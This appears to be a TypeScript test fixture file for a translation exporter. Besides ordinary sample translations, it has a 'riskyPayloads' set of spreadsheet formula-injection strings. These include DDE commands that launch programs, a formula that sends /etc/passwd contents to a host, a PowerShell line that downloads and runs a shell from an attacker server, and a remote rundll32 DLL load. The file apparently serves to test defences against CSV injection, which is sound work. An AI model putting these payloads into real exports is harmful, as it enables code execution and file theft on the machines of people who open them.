import * as fs from 'fs';
import { IntermediateTranslationFormat } from '../../domain/formatters';

export const loadFixture = (name: string) => {
  return fs.readFileSync(`src/formatters/fixtures/${name}`, { encoding: 'utf-8' });
};

export const simpleFormatFixture: IntermediateTranslationFormat = {
  translations: [
    {
      term: 'term.one',
      translation: 'Current Plan: {{ project.plan.name }}',
    },
    {
      term: 'term two',
      translation: '{VAR_PLURAL, plural, =0 {locales} =1 {locale} other {locales} }',
    },
    {
      term: 'TERM_THREE',
      translation: 'Export format...',
    },
    {
      term: 'term:four',
      translation: `hello there you\\nthis should be in a newline`,
    },
  ],
};

export const riskyPayloads: IntermediateTranslationFormat = {
  translations: [
    {
      term: `=HYPERLINK('https://www.google.com', 'Google')`,
      translation: 'hyperlink function in excel',
    },
    {
      term: `=HYPERLINK(CONCATENATE('http://0.0.0.0:80/123.txt?v='; ('file:///etc/passwd'#$passwd.A1)); 'test-poc')`,
      translation: 'hyperlink concatenate function in csv',
    },
    {
      term: `=cmd|' /C calc'!A0`,
      translation: 'to open the calculator application on the target machine (calculator automatic open command)',
    },
    {
      term: `@SUM(1+9)*cmd|' /C calc'!A0`,
      translation: 'to open the calculator application on the target machine (calculator automatic open command)',
    },
    {
      term: `=10+20+cmd|' /C calc'!A0`,
      translation: 'to open the calculator application on the target machine (calculator automatic open command)',
    },
    {
      term: `=cmd|' /C notepad'!'A1'`,
      translation: 'to open the calculator application on the target machine (notepad automatic open command)',
    },
    {
      term: `=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0`,
      translation: 'wget attacker server shell',
    },
    {
      term: `=cmd|'/c rundll32.exe \\10.0.0.1\\3\\2\\1.dll,0'!_xlbgnm.A1`,
      translation: 'rundll32 extension',
    },
  ],
};
